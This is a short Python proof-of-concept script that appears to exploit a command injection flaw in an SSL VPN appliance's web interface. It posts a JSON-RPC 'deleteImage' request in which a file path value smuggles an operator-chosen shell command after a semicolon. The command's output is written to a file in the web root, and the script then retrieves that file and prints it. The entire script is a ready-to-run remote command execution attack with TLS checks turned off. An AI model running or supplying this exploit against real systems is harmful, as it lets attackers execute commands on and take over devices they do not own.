# -*- encoding: utf-8 -*-
import requests
import sys
import getopt
import os
import binascii
import base64

requests.packages.urllib3.disable_warnings()

def start():
    if len(sys.argv) == 5 :
        opts, args = getopt.getopt(sys.argv[1:], "c:u:")
        for k,v in opts:
            if k == "-c":
                shell = v
            elif k == "-u":
                url1 = v
        requests1(shell,url1)
    else:
        print("python3 poc.py -c whoami -u url")



poc = "o9isu852j.txt"

def requests1(shell,url1):

        payload_data = """ {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;%s >/var/www/html/o9isu852j.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="} """ % shell
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4388.124 Safari/527.36',
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 ",
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Content-Length': '19443'
        }       
        payload_url = "/directdata/direct/router" 
        
        r_res = requests.post(url1+'/'+payload_url, data=payload_data, headers=headers,verify=False)
        r_exp = requests.get(url1+'/'+poc,headers=headers,verify=False)
        if r_exp.status_code == 200:
            print(r_exp.text)
        else:
            pass
    
start()


        








